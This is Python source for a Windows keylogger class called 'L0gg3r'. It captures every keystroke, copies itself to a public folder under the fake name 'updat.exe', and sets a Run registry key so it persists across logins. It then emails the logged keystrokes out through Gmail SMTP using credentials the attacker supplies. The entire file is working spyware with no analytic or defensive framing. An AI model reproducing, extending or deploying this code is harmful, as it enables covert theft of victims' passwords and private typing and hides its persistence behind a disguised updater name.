#!/usr/bin/python3
# -*- coding: utf-8 -*-

#standard library imports
import sys
import shutil
import smtplib
import datetime
import subprocess
from os import path
from time import sleep
from threading import Thread

# third party imports
from pynput.keyboard import Key, Listener


class L0gg3r:
    def __init__(self, email, key, id):
        self.email = email
        self.key = key
        self.id = id
        self.data = ''
        self.dir = 'C:\\Users\\Public\\Libraries\\updat.exe'


    def persist(self):
        shutil.copyfile(sys.executable, self.dir)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updat /t REG_SZ /d "' + str(self.dir) + '"', shell=True)


    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == Key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.data = self.data + current_key



    def send_mail(self):
        while True:
            if len(self.data) > 50:
                time = datetime.datetime.now()
                msg = '\n\n{0} Report from {1} = {2}'.format(str(time), str(self.id), self.data)
                try:
                    server = smtplib.SMTP_SSL(host='smtp.gmail.com')
                    server.connect('smtp.gmail.com', 465)
                    server.login(self.email, self.key)
                    server.sendmail(self.email, self.email, str(msg))
                    server.quit()
                    self.data = ''
                except:
                    sleep(120)
            else:
                sleep(120)


    def start(self):
        if not path.isfile(self.dir):
            self.persist()
        triggerThread = Thread(target=self.send_mail)
        triggerThread.start()
        with Listener(on_press=self.process_key_press) as listener:
            listener.join()
